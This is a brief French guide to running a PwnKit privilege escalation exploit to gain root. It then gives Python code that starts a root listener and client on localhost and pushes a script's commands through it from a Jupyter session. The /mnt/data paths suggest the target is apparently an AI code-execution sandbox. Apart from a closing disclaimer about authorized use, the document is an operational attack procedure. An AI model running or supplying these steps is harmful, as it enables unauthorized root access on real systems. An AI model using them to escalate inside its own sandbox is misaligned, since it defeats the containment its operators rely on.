Instructions d'Exécution
Exécuter l'Exploit PwnKit :

Ce script doit être exécuté en premier pour obtenir les privilèges root.
bash
Copier le code
python3 exploit_pwnkit.py
Démarrer l'Écouteur :

Avec les privilèges root obtenus, démarrer l'écouteur.

```python
import subprocess

# Démarrage du client comme sous-processus
client_process = subprocess.Popen(
    ["python3", "/mnt/data/client_root.py", "localhost", "8890"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True
)
```

De retour coté jupyter:

```python
import subprocess

# Fonction pour envoyer le fichier au client
def send_file_to_client(file_path):
    with open(file_path, 'r') as file:
        commands = file.read()
        return send_command_to_client(commands)

# Envoi du fichier au client
output = send_file_to_client(audit_script_path)
print(output)

# Lire les résultats
with open('/tmp/audit_results.json', 'r') as result_file:
    audit_results = json.load(result_file)

# Afficher les résultats
print(audit_results)

```

exploit_pwnkit.py : Pour exploiter PwnKit.
listener_root.py : Pour démarrer un écouteur avec des privilèges root.
client_root.py : Pour se connecter à l'écouteur et envoyer des commandes.
Avertissement
L'utilisation de ces scripts doit être faite de manière responsable et uniquement dans des environnements où vous avez l'autorisation appropriée. L'utilisation non autorisée peut entraîner des conséquences légales.

